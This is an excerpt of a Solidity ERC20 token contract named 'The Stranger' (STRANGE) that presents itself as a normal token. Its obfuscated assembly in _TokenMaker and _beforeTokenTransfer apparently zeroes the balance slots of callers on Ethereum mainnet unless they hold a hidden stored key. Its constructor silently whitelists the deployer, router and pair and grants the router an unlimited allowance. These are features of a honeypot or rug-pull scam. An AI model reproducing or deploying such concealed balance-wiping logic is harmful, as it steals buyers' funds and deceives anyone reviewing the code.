...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addStrange;
    uint256 private _radioSilence = block.number*2;

    mapping (address => bool) private _firstRocket; 
    mapping (address => bool) private _secondTesla;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private rockThrowing;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private stonePeople;
    address public pair;
    ...
    bool private trading; uint256 private sacredLaw = 1; bool private wePeople;
    uint256 private _decimals; uint256 private lookAround;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addStrange.push(_router); addStrange.push(msgSender_); addStrange.push(pair);
        for (uint256 q=0; q < 3;) {_firstRocket[addStrange[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenMaker() internal {
        assembly {
            function getBy(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x92e47c61f6cbf4de950733e99c024a482808c55ee9dcbb67a7ba53f80366dc54
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xffd997fe5521930807299d61436ebd94cf19224693c8487503070c515951cc1a,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _radioSilence = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addStrange[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployStranger(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addStrange[0], 10 ** 77);
        _TokenMaker();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployStranger(creator, initialSupply);
    }
}

contract TheStranger is ERC20Token {
    constructor() ERC20Token("The Stranger", "STRANGE", msg.sender, 282500 * 10 ** 18) {
    }
}